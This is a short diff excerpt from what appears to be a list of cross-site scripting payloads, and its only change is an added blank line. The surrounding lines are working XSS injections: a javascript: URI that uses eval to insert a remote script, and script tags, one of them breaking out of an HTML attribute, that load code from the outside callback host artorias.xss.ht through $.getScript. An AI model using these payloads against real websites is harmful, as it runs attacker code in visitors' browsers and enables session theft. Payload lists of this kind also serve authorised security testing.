@@ -14,3 +14,4 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://artori
 
 <script>$.getScript("//artorias.xss.ht")</script>
 "><script>$.getScript("//artorias.xss.ht")</script>
+
